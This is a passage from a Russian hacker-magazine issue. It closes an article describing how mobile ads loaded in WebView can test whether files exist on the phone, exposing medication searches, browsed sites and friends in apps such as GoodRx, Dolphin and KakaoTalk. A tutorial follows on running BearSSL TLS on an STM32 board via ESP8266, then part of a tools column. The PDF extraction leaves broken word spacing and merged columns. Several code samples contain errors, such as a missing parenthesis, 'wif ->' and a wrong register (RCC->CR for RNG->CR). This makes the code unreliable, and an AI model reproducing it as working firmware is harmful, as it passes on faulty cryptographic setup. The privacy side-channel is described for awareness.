лы тоже, по идее, принадлежат разным доменам, координацию доступа осу‐
ществлять некому.
   Встраиваемые браузерные компоненты, такие как WebView, позволяют
мобильному приложению инклудить локальные фай лы из внешнего хранили‐
ща твоего смартфона. Когда AdSDK использует для загрузки объ явления
loadDataWithBaseURL(), то коду HTML этого объявления разрешается
инклудить локальные файлы из внешнего хра нилища твоего смартфона
в качестве DOM‐элементов. Пробуя подключить DOM‐элемент, чей URI ука‐
зывает на локальный файл, мобильное объявление тем самым узнаёт, сущес‐
твует ли этот файл на тво ем смартфоне.
   Такой импровизирован ный ора кул работает, если:
 • ты используешь относительно старую версию Android (до версии 5.0);
 • AdSDK взаимодейству ет со сво им сервером через HTTP вместо HTTPS.


             INFO

                    Печальная новость зак лючается в том, что три
                       из четырех самых распространенных AdSDK —
                    AdMob, MoPub и AdMarvel — передают свои объ‐
                       явления именно через HTTP.



ПРИМЕРЫ УГРОЗ
Теперь я хочу на реальных примерах показать, как знание о наличии некоего
файла может быть использовано для эксфиль тра ции твоей конфиденциаль‐
ной информации.


GoodRx
GoodRx — приложение для поиска лекарств. Оно кеширует изображения
лекарств, которые пользователь искал или добавил в закладки. Злоумыш‐
ленник может создать список из нес кольких десятков антидепрессантов
и подготовить массив, который будет содержать имена соответс твующих
изображений, чтобы затем сравнивать их с уже кешированными изображени‐
ями. Таким образом информация о любых препаратах, которые ты принима‐
ешь, может оказаться в руках людей, которым ты бы предпочел никогда ее
не доверять.





                           GoodRxJS


Dolphin
Dolphin — веб‐браузер для Android. Приложение кеширует во внешнем хра‐
нилище изображения и загруженные страницы, чтобы уменьшить нагрузку
на сеть. В качестве имен файлов для кешированных адресов Dolphin исполь‐
зует хеши, сгенерированные функцией String.hashCode(). Это 32‐битное
целочисленное значение. Уже описанным спо собом — проверяя наличие
файлов с определенных сайтов — можно выяс нить, посещал ли ты их.





                                DolphinJS


             INFO

                     Внимательный читатель заметит, что здесь через
                      параметр src  элемен ту script  передается
                      не файл JS. Но скрипт загружать и не нуж но, дос‐
                         таточно проверить наличие целевого файла. Если
                      целевой файл присутс твует на твоем смартфоне,
                         то WebView радостно вызывает callback, который
                       генерирует событие «Загрузка прошла успешно».
                      Эта  техника  позволяет правильно определять
                       сайты, которые ты посещал через Dolphin.



KakaoTalk
KakaoTalk — еще одно приложение, которое может стать брешью в твоей
безопасности. А возможно, не только твоей. Мини атюрные аватарки твоих
друзей приложе ние кеширу ет во внешнем хранилище. Если злоумышленник
сгенерирует таблицу сопос тавления кешированных миниатюр с соответству‐
ющими им людьми, то сможет легко идентифицировать твоих друзей. Даже
если число попыток будет ограничено, все равно возможно узнать, было ли
показано объявление конкретному человеку.
   Как? А все тем же сканированием во внешнем хранилище. Только теперь
злоумышленник будет искать среди кешированных аватаров твоих друзей.
При этом следует понимать, что даже частичная информация о социальных
пересечениях жер твы помога ет однозначно идентифицировать ее. Пред‐
полагаемая личность может быть затем подтверждена при помощи данных
геолокации и других метаданных, дос тупных злонамеренному рекламода‐
телю. Метаданных, которые по отдельнос ти не значат практически ничего,
но в совокупности — дос товерно идентифицируют личность.


ИТОГИ
Когда речь заходит о кибербезопас ности — по крайней мере, когда речь
о ней заходит в кор поративном ключе, — принято говорить об управлении
рисками. Следует понимать, что при желании нас могут взломать: вопрос
только в том, сколько это будет сто ить злоумышленни ку и как сильно он хочет
взломать.
  Для атаки, которую я описал, насколько мне известно, пока нет противо‐
ядия. Но осведомлен — зна чит вооружен. Поэтому, когда будешь скачивать
очередное бесплатное приложение с рекламными объявлениями, помни, что
заплатишь ты не только тем, что пос мотришь на товары, но, воз можно, и кон‐
фиденциальностью.
ТРЮКИ


   BEARSSL
     И
    STM32

           КАК РЕАЛИЗОВАТЬ
          ШИФРОВАНИЕ
        ДЛЯ САМОДЕЛЬНОГО
              ГАДЖЕТА





«Хакер»  немало  писал  об  уязвимостях
самых  разных  гаджетов,  а  вот о  том,
как   создать  защищен ное   устройство
самому, мы до сих пор не говорили. Нас‐
тало время посмотреть на эту проблему               faberge                                                                                  Программирую
с другой стороны: в этой статье мы сде‐      наблюдаямикроконтроллеры,фазовый переход
лаем свой девайс, запустив шифрован ное       на границеshirous@yandex.ruкода и железа.
соединение  TLS  на  микроконтроллере
STM32.


ЖЕЛЕЗО
Нам понадобятся официальная оценочная плата Discovery компании STMicro‐
electronics и модуль Wi‐Fi на ESP8266. Последних существу ет огромное
количество, подойдет практичес ки любой. Главное, чтобы там были выводы
RX/TX UART и стан дартная прошивка для работы с АТ‐командами. Я исполь‐
зую отечественный Troyka (модуль компании «Амперка») прос то потому, что
он у меня уже есть.





                         Главные герои статьи

F746G Discovery — это практичес ки Ferrari в мире хобби‐электроники.
Мощный микроконтрол лер (Cortex‐M7, 216 МГц) тут сочетается с микросхе‐
мой SDRAM внушительных объемов (целых 8 Мбайт) и полезной периферией:
экран 480 × 272 с 24‐битным цветом, интерфейс SDIO для карт памяти, разъ‐
емы аудио и Ethernet.
  Я не буду перечислять все доступные воз можнос ти этой платы — ты
можешь найти подробнос ти на сайте про изводителя STMicroelectronics. Все
то, что раньше приходилось добавлять к Arduino с помощью дочерних плат
расширения или модулей, тут доступно «из коробки». Да, цена соответству‐
ющая — порядка 6500 рублей. Но когда это спортивные автомобили были
для простого народа?


             INFO

                     F746G  Discovery — не единственный вариант
                     демоплаты для это го проекта. Ты можешь с таким
                    же успехом использовать, например, отла дочную
                       плату из серии Nucleo: F767ZI Nucleo. Для нее
                      тоже есть поддержка в пакете STM32duino, и она
                        гораздо дешевле — около 3000 рублей. Такого
                       разнообразия периферии у нее, правда, нет.


Полноценно нагрузить все компоненты и использовать воз можнос ти F746
Discovery на сто процентов в одном проекте непросто. Сегодня с помощью
библиотеки bearSSL мы протестиру ем только вычислительную мощь ядра
Cortex‐M7 в прикладных задачах криптографии.


        WWW

                      Программирование под STM32 предполагает вни‐
                       мательное изучение соп роводительной докумен‐
                         тации. Сегодня я постараюсь осветить все под‐
                      робности и интересности, которые встретятся
                     нам на пути, но в дальнейшем все же настоятель‐
                      но рекомендую обратиться к следующим матери‐
                      алам (все ссылки — на PDF):
                    •UM1907 — самая полная информация о плате
                            Discovery:  компоненты,  схемы,  назначение
                        разъемов и прочее.
                     •DS10916 —  даташит  на  мик роконтроллер.
                        Полезен  распиновкой  микросхемы  F746NG
                         в различных корпусах.
                    •RM0385 — говорят, на тех, кто осилит пол‐
                        ностью все 1700+ страниц мануала, снисходит
                       божественное просветление.



НАСТРАИВАЕМ IDE
В качестве среды разработки я выб рал Arduino IDE. Проект открытый, и вокруг
него успе ло сложиться большое сообщество, так что это хороший выбор
как для новичка, так и для продвинутого пользователя. Кроме того, этот
выбор позволит нам вос пользоваться уже готовой кодовой базой. Таким
образом, мы про пустим тривиальную нас трой ку периферии и быс тро перей‐
дем к вещам более интересным.
  Изначально в Arduino IDE доступны только пла ты на AVR‐микроконтрол‐
лерах, ни о каком ARM она и не слышала. Чтобы включить поддержку плат
STM32duino, нужно перейти в раз дел Arduino → Preferences и добавить
дополнительную ссылку. После этого в «Менеджере плат» ты сможешь ска‐
чать все необходимые файлы пакета.


             INFO

                    Во время установки опция с STM32duino может
                      и не появиться в списке доступных для установки
                       расширений. В этом случае проверь разрешения
                       для Arduino IDE на работу по сети или добавь
                        в список исключений для антивируса.



ИЩЕМ ПРОПАВШИЙ SERIAL
Если ты еще не проверил корректность работы компилятора и самой платы
на парочке простых примеров из числа встроенных, то сейчас самое вре мя.
Потому что мы переходим к правке исходных файлов по адресу «Библиотеки
→ Arduino15 → packages → STM32 → hardware → stm32» (советую сделать
копию папки, ты знаешь, как оно быва ет). Все дело в том, что проект STM32‐
duino поддерживается энтузиас тами (хотя сейчас им заинтересовалась сама
STMicroelectronics) и, как следс твие, часть функций Arduino реализована,
а часть почему‐то оказалась забыта.
  Например, по умол чанию отсутс твует последовательный порт  (Serial)
на выводах D0 и D1 разъема Arduino. Если ты знаком с оригинальными италь‐
янскими платами (и их многочисленными китайски ми клонами), то знаешь,
что этот порт связан с разъемом USB через UART — USB‐преобразователь
в основном используется для общения с компьютером и при перепрошивке
флеш‐памяти. На Discovery все несколько по‐другому.
  Микроконтрол лер F746NGH6 прошива ется с помощью встроенного прог‐
рамматора ST‐Link/V2‐1 (небольшая микросхема возле miniUSB‐порта). Он
же выступает в качестве преобразова теля интерфейсов при отправке данных
на ПК. Но все это дела ется по другому UART — вовсе не тому, который
выведен на плате на разъем Arduino (да, у контроллеров ST богатая перифе‐
рия, об этом следовало сказать заранее).
   Если в прошлом ты использовал пла ту Arduino Leonardo, то можешь пред‐
положить, что для этого интерфейса используется объект Serial1. Но нет!
В проекте STM32duino нумерация прог раммных портов Serial соответству ет
номеру аппаратного периферийного блока UART, и поэтому в любом коде
для нашей Discovery Serial и Serial1 — это один и тот же объект (исполь‐
зуется переопределе ние).
   Как  тогда  обращать ся  к UART  на  разъ еме  Arduino?  Изучив  таб‐
лицу 4 на странице 23 документации демоп латы, ты узнаешь, что это RX/TX‐
выводы UART6.
  Впрочем, одного лишь это го знания будет недос таточно: компилятор
сообщит, что Serial6 не определен. Чтобы добавить порт UART для работы
с ESP8266, нужно отредактировать конфигура ционные файлы самой платы —
они располагаются по адресу stm32 → 1.4.0 → variants → DISCO_746NG.
В самих файлах нет ни намека на возможное решение проблемы, но тщатель‐
ное изучение исходников проекта STM32duino (папка cores на уровне с vari‐
ants) должно навести на определенные идеи. На самом деле нам достаточно
добавить несколько строчек в файл variants.h:


#define ENABLE_HWSERIAL6        1
#define PIN_SERIAL6_RX          PC7
#define PIN_SERIAL6_TX          PC6

Почему их нельзя было оста вить в файле закомментированными, чтобы поль‐
зователи не тратили время на знакомство с нюансами реализации Arduino‐
окружения на платах от ST, — это для меня загадка. Однако теперь объ ект
Serial6 станет доступен в нашем коде, и мы наконец сможем наладить вза‐
имодействие с модулем Wi‐Fi.


             INFO

                     Следующие шаги опциональные, однако, если ты
                      хочешь  получить  максимум  быстродействия
                         от связки F746 и ESP8266, советую их не пропус‐
                           кать. Тем более что после них с настройкой окру‐
                      жения будет наконец покончено.



ДОПОЛНИТЕЛЬНО
Нам нужно настроить размеры внутренних буферов класса HardwareSerial
на прием и передачу информа ции по интерфейсу UART. По умолчанию раз‐
меры подобраны для плат Arduino с микроконтроллерами AVR, и это может
стать проблемой при переда че больших мас сивов данных (как раз наш слу‐
чай). В папке cores → arduino открой файл HardwareSerial.h и найди в нем
такие строчки:


#define SERIAL_TX_BUFFER_SIZE    64
#define SERIAL_RX_BUFFER_SIZE    64

Это размер буферов в байтах. Исправь 64 на 512, разрядность перемен‐
ной‐индекса при этом  будет  скорректи рова на  автоматически. Вообще
говоря, размеры буферов не обязаны совпадать, и, если в твоем проекте
памяти у микроконтроллера остается впритык, стоит увеличивать только
буфер RX. Также обрати внимание, что эти изменения затронут все твои скет‐
чи для плат STM32duino (но не для Arduino AVR или ARM).
   Теперь  осталось  только  уско рить  UART.  Изначально  все  модули
ESP8266 со стандартной прошивкой для работы с АТ‐командами настроены
на скорость 115 200 бод. Если ты используешь прог раммный порт Software‐
Serial, скорость рекомендуют умень шить до 9600. В нашем случае, нап‐
ротив, разумней проводить прием и переда чу быстрее, контроллер справит‐
ся, а время терять незачем. Подключи модуль Wi‐Fi к плате и залей сле‐
дующий скетч:


void setup() {
    Serial.begin(9600);
    Serial6.begin(115200);
}
void loop {
    if (Serial.available()) {
        Serial6.write(Serial.read());
    }
    if (Serial6.available() {
        Serial.write(Serial6.read());
    }
}

С помощью «Монито ра порта» в Arduino IDE ты сможешь изменить настройки
UART на ESP8266, используя плату Discovery в качес тве ретранслятора (если
у тебя есть отдельный преобразователь USB — UART, то все еще проще).
Убедись, что конец строки в терминале — это NL & CR. Набери АТ‐команду
AT+UART_DEF=1000000,8,1,0,0. Это уста новит скорость работы в 1 Мбод,
длину 8 бит и один стартовый бит вначале. Все, пора переходить к главному!


AT-коман ды
Порой бывает удоб но проверить сос тояние модуля Wi‐Fi через «Монитор
порта» простыми AT‐командами, не используя биб лиотечные функции. Вот
самые полезные:
 • AT — базовая команда, если модуль не отвечает на нее, стоит проверить
   подклю чение или питание.
 • AT+CWLAP — показывает список доступных точек дос тупа.
 • AT+CIPSTATUS — состояние текущего подключения.

Остальные команды ты найдешь в документации.



SSL/TLS — САМОЕ НЕОБХОДИМОЕ
В этой статье я не буду подробно оста навливать ся на протоколах SSL/TLS
по трем причинам. Первая: вполне вероятно, ты знаешь их лучше меня. Вто‐
рая: они доступно описаны в документах RFC (RFC5246 и RFC6101 для TLS
1.2 и SSL 3.0 соот ветственно). И третья — порог вхождения там невелик,
и тебя вряд ли ждут большие затруднения.
  По сути, нужно знать следующее: код TLS работает непосредс твенно меж‐
ду приложением и уже готовым TCP‐соединением, обес печивая при ватность
и конфиденциальность переда чи информации меж ду сервером и клиентом
(ну и еще, как плюс, успокаивающе‐зеленый замочек в браузе ре).
  В нашем примере мы попробуем получить у какого‐нибудь сервера
в интернете страничку по HTTPS с нашей демоп латы на STM32. Слу чай
с простым HTTP‐запросом осо бого интереса не представляет и хорошо
освещен в интернете, как в русскоязычном, так и в англоязычном сегменте.
TCP у нас уже есть (благодаря ESP8266 и рабочему Serial6), какого‐то осо‐
бо сложного приложения пока не предвидится, так что вся задача сводится
к обеспечению кор ректной работы биб лиотеки. Осталось выбрать, какой
именно.


ЗООПАРК ДИКИХ ЗВЕРЕЙ
Если ты до этого когда‐нибудь интересовался доступными вари антами биб‐
лиотек SSL/TLS, то не мог не слышать о проекте OpenSSL. Это весьма рас‐
пространенное решение, но для встра иваемых систем, с их относительно
скромными ресурсами, желательно найти биб лиотеку с хорошей портатив‐
ностью и небольшим объемом итогового кода.
  Зачастую для коммерческого использования разработчики выбирают wolf‐
SSL — она предназначена специально для мобильных устройств. Это биб‐
лиотека с открытым исходным кодом, лицензированным по GPL (есть и ком‐
мерческая лицен зия), собственным сайтом, форумом и даже некоторой под‐
держкой со стороны авто ров.
  Плюсом библиотеки можно  считать  уже  готовые наборы  настроек
в заголовочных файлах, ориентированные на различные целевые платформы.
Однако даже при поверхностном зна комстве обилие опре делений в wolfSSL
и чрезмерное исполь зование препроцес сора на начальных этапах осложняет
портирование и конфигурацию библиотеки в каждом конкретном случае, если
он заранее не предусмотрен авторами биб лиотеки.
  Поэтому, подробнее изу чив альтернативы, я обратил внимание на биб‐
лиотеку bearSSL. Это сравнитель но молодой про ект, который с 2016 года
развивается и поддерживается усилиями одного программиста. При этом
код очень прозрачно орга низован, хорошо прокомментирован как внутри
самих исходных файлов, так и на сайте.
  Может показаться, что документации меньше в сравнении c wolfSSL,
но при этом ее достаточно, и она не отвлекает от главного. Исходный код так‐
же открыт, а усло вия лицензии даже мягче — это MIT, что в некоторых случаях
может быть дополнительным аргументом.
  И хотя автор говорит о ста тусе бета‐версии, биб лиотека полноценно под‐
держивает стандарт TLS 1.2 (wolfSSL уже доступна с TLS 1.3, но официально
RFC8446 был принят толь ко в августе 2018‐го).
  Примечательно, что работа с этими биб лиотеками во многом очень схожа
(и в итоге были реализованы две рабочие версии прошивки для платы), я
остановил выбор на bearSSL.


           WARNING

                    Ни  автор  материала,  ни  редак ция  журнала,
                      ни тем более автор биб лиотеки никакой ответс‐
                        твенности за возможный причиненный ущерб,
                        упущен ную  прибыль  и  прочие  неприятности
                      не  несут.  Код  предоставляется  «как  есть»,
                       без каких‐либо гарантий, включая гарантию соот‐
                        ветствия какому‐либо назначению (но не огра‐
                       ничиваясь ей).



ПРИРУЧАЕМ БИБЛИОТЕКУ
Для работы bearSSL требуется платформозависимая реализация трех вещей:
текущего времени, пула случайных чисел и базовых функций ввода‐вывода.
Их придется написать самос тоятельно, но это не займет много времени. Наш
код будет взаимодействовать с периферией пла ты и микроконтрол лера,
поэтому тут как нельзя кстати пригодятся ссылки, которые я давал в начале
статьи.


Дата и вре мя
Функция текущего системного времени — важный компонент при проверке
сертификата подлинности сайта, с которым мы собираемся установить
защищенное соединение. В больших компьютерах этим занимается опе‐
рационная система и пользователю достаточно добавить в свой код под‐
ходящие вызовы.
  Библиотека bearSSL зависит от стандартной функции _gettimeofday().
Если ты попытаешься скомпилировать про ект сейчас, то компоновщик сооб‐
щит, что этот символ не определен. Оно и понятно: сразу после подачи
питания на микроконтроллер нет какого‐то общего способа узнать текущее
системное время (тем более в отсутствие ОС). Но у нас есть модуль Wi‐Fi,
поэтому предлагаю воспользоваться им и сделать запрос к серверу точного
времени.


#include "ESP8266.h"
#define PORT           (123)
#define BUFFER_SIZE    (48)
#define TIME1970       ((uint32_t)2208988800) /* seconds between
1900 — 1970 */
extern ESP8266 *wifi; /* should be defined in main */
int _gettimeofday(struct timeval *tv, void *tzvp ) {
    /* prepare message */
    uint8_t buffer[BUFFER_SIZE];
    memset(buffer, 0, BUFFER_SIZE);
    buffer[0] = 0xE3;
    buffer[2] = 0x06;
    buffer[3] = 0xEC;
    buffer[12] = 0x31;
    buffer[13] = 0x4E;
    buffer[14] = 0x31;
    buffer[15] = 0x34;
    /* connect to server */
    wifi ‐> registerUDP(«time.nist.gov», PORT);
    wifi ‐> send(buffer, BUFFER_SIZE);
    wifi ‐> recv(buffer, BUFFER_SIZE, 1000);
    wifi ‐> unregisterUDP();
    /* calculate the result */
    uint32_t epoch = buffer[40] << 24 | buffer[41] << 16 | buffer[42]
 << 8 | buffer[43];
    epoch ‐= TIME1970;
    tv ‐> tv_sec = epoch;
    tv ‐> tv_usec = 0; /* do not need this */
    return 0;
}

К слову, ты можешь задавать время либо в про цес се компиляции (даже приб‐
лизительно), либо воспользовавшись модулем RTC. На результатах проверки
срока действия сертификата это сказать ся не дол жно.


Аппаратный ГСЧ
Традиционный подход к генерации случай ных чисел в среде Arduino выглядит
примерно так:


int i = analogRead(A0); /* A0 is NOT connected */
srand(i);
int num = rand();




                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
    BEARSSL И STM32
                    КАК РЕАЛИЗОВАТЬ ШИФРОВАНИЕ
                   ДЛЯ САМОДЕЛЬНОГО ГАДЖЕТА




Такой программный метод имеет пра во на жизнь в прос тых ситуациях, но для
криптографического применения он решительно не подходит. К счастью,
у микроконтроллера F746NG богатая периферия и есть ГСЧ (TRNG, True Ran‐
dom Number Generator). Им мы и вос пользуемся, предварительно заглянув
в документацию (RM0385, с. 543). Там всего‐то три регистра, которые отве‐
чают за взаимодействие с аппа ратной частью, — RNG_CR (Control Register),
RNG_SR (Status Register) и RNG_DR (Data Register).


#include <stm32f746xx.h> /* for CMSIS defines */
void rng_enable() {
    if (RNG ‐> CR & RNG_CR_RNGEN) {
        return; /* already enabled */
    }
    RCC ‐> AHB2ENR |= RCC_AHB2ENR_RNGEN; /* clock enable */
    RCC ‐> CR |= RNG_CR_RNGEN; /* rng on */
}
uint32_t rng_generate() {
    if (RNG ‐> SR & (RNG_SR_CECS | RNG_SR_SECS)) {
        return 0; /* seed error or clock error */
    }
    while (!(RNG ‐> SR & RNG_SR_DRDY)) {
        /* wait for data to appear */
    }
    return RNG ‐> DR;
}

Без знакомства с докумен тацией такой код может быть сложен для воспри‐
ятия, но зато это эффективно и, так как мы работа ем максимально близко
к железу (для языка С, разумеется), требует минимум машинных инструкций
(в отличие от библиотек HAL, Hardware Abstraction Layer). Конечно, настройка
остальной периферии занимает чуть больше времени и мес та, но принцип
остается тем же. Так что со временем изучение CMSIS обязательно оку пит
себя.

Фун кции вво да‑вывода
BearSSL внутри состоит из трех гло бальных объектов: движок, контекст кли‐
ента (или сервера) и контекст проверки сертифика тов. Это платформонеза‐
висимые вещи, и для свя зи с внешним миром им нужны все го две базовые
функции на прием и переда чу, которые необ ходимо зарегистрировать в биб‐
лиотеке для обратного вызова. Это ключевая часть пользовательского кода,
поэтому есть смысл потратить время и изу чить ее подробнее.


#include "bearssl.h"
#include "ESP8266.h"
#define INPUT_SIZE       (0x2000) /* 8 KiB should be enough */
static uint8_t input[INPUT_SIZE];
/* bearSSL local objects */
static br_ssl_client_context sc;
static br_x509_minimal_context xc;
static br_sslio_context ioc;
/* TCP/SSL driver variables  */
static uint_fast16_t rx_bytes = 0; /* number of received bytes */
static uint_fast16_t p = 0; /* input buffer index */
extern ESP8266 *wifi; /* should be defined in main */
static int wifi_recv(void *ctx, unsigned char *b, size_t len) {
    uint_fast16_t rq_bytes = len; /* bearSSL requested some bytes */
    while (rx_bytes ‐ p < rq_bytes) { /* have to fullfill request */
        while (int rec_len = wifi ‐> recv(input + rx_bytes, INPUT_
SIZE ‐ rx_bytes, 100)) {
            rx_bytes += rec_len; /* received bytes */
        }
    }
    while (rq_bytes‐‐ > 0) {
        *(b++) = input[p++]; /* handle all bytes to bearSSL */
    }
    return len; /* request completed, report success*/
}
static int wifi_send(void *ctx, const unsigned char *b, size_t len) {
    rx_bytes = p = 0; /* flush input buffer */
    return wifi ‐> send((uint8_t*) b, len) ? len : 0; /* if not
success, report to be called again */
}

Обрати внимание на размер буфера и его расположение. Протокол SSL/TLS
предусматривает длину сооб щений до 16 Кбайт. На практике ты вряд ли
встретишь настолько большие сообщения, поэто му 8 Кбайт выглядят разум‐
ным компромиссом. Кроме того, буфер размещен во внутренней SRAM мик‐
роконтроллера. Так как буферов у нас будет больше одного, воз можно,
это не самое удачное место.
  В самом начале я говорил о внеш ней микросхеме SDRAM, которая име ет
гораздо больший объем (8 Мбайт против 320 Кбайт) при сравнительно оди‐
наковой скорости и времени доступа. Пос ле инициализации FMC и банков
памяти это пространство будет дос тупно для прог раммы, и, скорее всего,
это более подходящее место. Однако это увело бы нас чуть в сторону
от основной темы статьи.
  Основное место в коде занимают методы recv() и send() класса ES‐
P8266. Именно для использования готовой библиотеки пришлось искать про‐
павший Serial6 в исходниках STM32duino. Зато, уже имея на руках отлажен‐
ный  код,  сравнительно  прос то  организовать  учет  данных,  принятых
и переданных bearSSL.
   Здесь есть нюанс: иногда метод recv() не находит доступного сегмента
и возвращает ноль, хотя прием еще не был завершен. К счастью, библиоте ка
bearSSL лучше знает, сколько байтов должно поступить (для этого в заголов‐
ке каждого сообщения SSL/TLS есть поле с количеством байтов в теле),
поэтому доверяемся ей и не выходим из внешнего цикла while до окон чания
передачи.


ПОДКЛЮЧАЕМСЯ К API
Теперь, когда все готово, надо протестировать наш код на чем‐то интерес‐
ном. Вообще, потребность подклю чения и нас трой ки библиотеки bearSSL
под STM32 лично у меня возникла, ког да я захотел парсить данные с рынка
в одной популярной многопользовательской игре и выводить их на допол‐
нительный дисплей. Уверен, у тебя уже есть свои мысли, как с пользой при‐
менить полученные знания, поэтому буду кра ток и просто покажу как пример.





                Дос ка объявлений в Final Fantasy XIV

Самый простой способ получить акту альные рыночные цены для FFXIV —
это посылать запросы на сторонний сервис, который предоставляет API, он
называется XIVAPI. Но сам сервер ограничивает число запросов за секунду, и,
чтобы вести подсчет, требуется вместе с зап росом посылать уникальный
ключ клиента или приложения (стандартно). Именно чтобы сохранять ключ
в секрете и не позволить треть ей стороне использовать сервис от нашего
лица,  запрос  сле дует  посылать  по HTTPS‐протоколу  с шиф рованием
SSL/TLS.


#include "ESP8266.h"
#define PORT              (443)
#define BR_IN_SIZE        (0x2000)
#define BR_OUT_SIZE       (0x2000)
#define BUFFER_SIZE       (0x2000)
#define ENTROPY_SIZE      (8) /* total 256‐bits of random from
hardware RNG */
const char *ap_name = "wifi_name"; /* user defined */
const char *ap_pswd = "wifi_pswd"; /* user defined */
const char *host = "www.xivapi.com";
const char *path = "/market/cerberus/items/18189/history?key=XXXXXX
XXXXXX"; /* user defined */
ESP8266 *wifi;
static uint8_t iobuf_in[BR_IN_SIZE];
static uint8_t iobuf_out[BR_OUT_SIZE];
static uint8_t buffer[BUFFER_SIZE]
void setup() {
    uint32_t entropy_pool[ENTROPY_SIZE];
    Serial.begin();
    Serial.println();
    wifi = new ESP8266(Serial6, 1000000);
    wif ‐> joinAP(ap_name, ap_pswd);
    br_ssl_client_init_full(&sc, &xc, TAs, TAs_NUM); /* user defined
trust anchors */
    br_ssl_engine_set_buffers_bidi(&sc.eng, iobuf_in, sizeof(iobuf_in
),


 iobuf_out, sizeof(iobuf_out));
    rng_enable();
    for (uint_fast8_t i = 0; i < ENTROPY_SIZE; ++i) {
        entropy_pool[i] = rng_generate();
    }
    br_ssl_engine_inject_entropy(&sc.eng, entropy_pool, sizeof(entrop
y_pool));
    br_sslio_init(&ioc, &sc.eng, wifi_recv, wifi, wifi_send, wifi);
}
void loop() {
    wifi ‐> createTCP(host, PORT);
    /* send request */
    br_ssl_client_reset(&sc, host, 0);
    br_sslio_write_all(&ioc, "GET ", 4);
    br_sslio_write_all(&ioc, path, strlen(path));
    br_sslio_write_all(&ioc, " HTTP/1.1\r\nHost: ", 17);
    br_sslio_write_all(&ioc, host, strlen(host));
    br_sslio_write_all(&ioc, "\r\n\r\n", 4);
    br_sslio_flush(&ioc);
    /* receive answer */
    for (uint_fast16_t count = 0, len = 0;; count += len) {
        len = br_sslio_read(&ioc, buffer + count, BUFFER_SIZE ‐ count
);
        if (len < 10) { /* last record */
            buffer[count] = '\0';
            break;
        }
    }
    br_sslio_flush(&ioc);
    wifi ‐> releaseTCP();
    Serial.println((char*)buffer);
    delay(10000);
}

Если ты запустишь этот код (и если Хакану бис услышит твои молитвы), то
в «Мониторе порта» увидишь стандартный ответ сервера HTTP и полезную
нагрузку — JSON с ценами на сервере Cerberus для предмета с ID 18189 (к
слову, это High Steel Longsword).





Распарсить объект и получить любую интересу ющую информацию теперь
легко с помощью библиотеки rapidjson. Я обра баты ваю данные сразу на мик‐
роконтроллере и вывожу на дисплей с помощью периферийного модуля
LTDC. Это и близко не исчерпывает воз можнос ти микросхемы F746NG,
поэтому лично для меня впереди еще много работы по этому проекту.





  Конкурентное преимущество на рынке выглядит как‐то так. Инте ресно,
  за это банят?


ЗАКЛЮЧЕНИЕ
Надеюсь, тебе было интерес но и ты узнал для себя что‐то новое. Программи‐
рование близко к железу имеет свое очарование и поз воляет почувствовать
и понять все нюансы работы как программной, так и аппаратной части.
  К сожалению, я не смог в объеме статьи умес тить пол ноценную обработку
ошибок или вывод отла дочной информа ции (попробуй ради любопытства
выводить тело сооб щений SSL/TLS и сравни их с описанием в RFC). Но воз‐
можно, это и к лучшему. У тебя есть стимул допол нить и самос тоятельно улуч‐
шить код, как тебе будет нужно.
  Кроме  того, рекомендую все‐таки завес ти внешнюю SDRAM и рас‐
положить буферы ввода‐вывода там или подумать об использовании прямого
доступа к памяти (DMA). Не то чтобы это было так уж необходимо (по крайней
мере, на нашем этапе реализации), но откладывать опти мизацию на самый
конец — не лучшая идея.
  Еще один важный аспект производительности — это вре мя, которое при‐
ходится потратить на обра бот ку запроса. Сей час первое подключение к сер‐
вису и рукопожатие занимают от 4 до 6 секунд, пос леду ющие сообщения
от 2 до 2,5 секунды (когда параметры сес сии уже в кеше). Это не так уж пло‐
хо, все‐таки криптография требует приличного количества ресурсов, да и
запрос у нас с реальной полезной нагрузкой, а не просто HTTP/1.0 200 OK.
  На самом деле в линейке F7 от STMicroelectronics уже есть микросхе мы
с аппаратными блоками HASH и CRYP. По тестам, это позволяет сократить
время  некоторых вычислений  от  двух до  четырех  раз! К сожале нию,
на F746NG эта периферия недоступна, да и bearSSL их пока не поддержи‐
вает.
  Вместе с допол нитель ными библиотеками (для JSON и GUI) код занимает
всего 186 Кбайт ПЗУ (ROM) и 45 Кбайт ОЗУ (RAM). При этом около 40% ухо‐
дит на графический интерфейс и шрифты для экрана. Если использовать
внешнее хра нилище в виде QSPI ﬂash или карты microSD, то расход по памяти
можно еще сократить. Напомню, у микроконтроллера целый мегабайт ПЗУ
и 320 Кбайт ОЗУ, так что реализовать можно еще много интересного. Дер‐
зай!
ТРЮКИ





                       Андрей Письменный
                          Главный редактор
                           apismenny@gmail.com



      REMOVE.BG — СЕРВИС, КОТОРЫЙ ЗА СЕКУНДЫ УБИРАЕТ
     ФОН У ФОТОГРАФИЙ
       Первое, с чем сталкиваешь ся, когда хочешь сделать коллаж из нес‐1        кольких фотографий, — это необ ходимость убрать фон у картинки.
        Чего только не придума ли, чтобы упростить эту задачу! Сервис
        с говорящим названием remove.bg максимально облегчает процесс
        и не тре бует никаких дополнительных манипуляций — достаточно
         загрузить картинку.
        В этом же и главный недостаток remove.bg — он сам решает, где
        фон, а где объ ект и какие объекты нуж ны, а какие нет. В основе,
         как нынче принято, — ИИ на базе глу бокой ней росети. И надо
         отдать дол жное это му алгоритму: он неплохо справляется с растре‐
        панными волоса ми и про чими тонкими материями, зачастую непод‐
        властными обычной «волшебной палочке» в Photoshop.





       На выходе ты получаешь картинку в формате PNG с прозрачным
        фоном, которую можно тут же отпра вить в редактор. Регистри‐
        роваться на remove.bg не нужно, никаких квот нет.
           Кстати, если тебе вдруг понадобится сделать картинку покрупнее,
        не теряя в качестве, то обрати внимание на другой сервис — LetsEn‐
         hance.io. Он поз воля ет бес платно обработать до пяти изображений
        и справ ляется с задачей намного лучше, чем ресайз в фоторе дак‐
         торе.


      HOMELABOS — МЕНЕДЖЕР ПРИЛОЖЕНИЙ ДЛЯ ТВОЕГО
      ЛИЧНОГО СЕРВЕРА
       Поскольку недоверие к сторонним сервисам все растет, а цены2        на выделенные серверы с Linux нын че низки, развернуть собствен‐
        ное облачное хозяйство становится все более привлекательной
        идеей. Конечно, ты можешь деплоить все приложения сам, но про‐
         ект под названием HomelabOS предлагает другой подход и стре‐
        мится сделать серверный софт нас только же прос тым в обращении,
         как и десктопный.
          Развернув HomelabOS на сво ем сервере, ты сможешь в один
         клик устанавливать софт из предложенного набора. Всего сейчас
        доступно 35 программ, среди которых средс тва для автоматизации,
       медиасерверы, торрент‐клиент с надс трой ками для скачивания
        передач и сериалов по рас писанию, файловые хостинги, вики
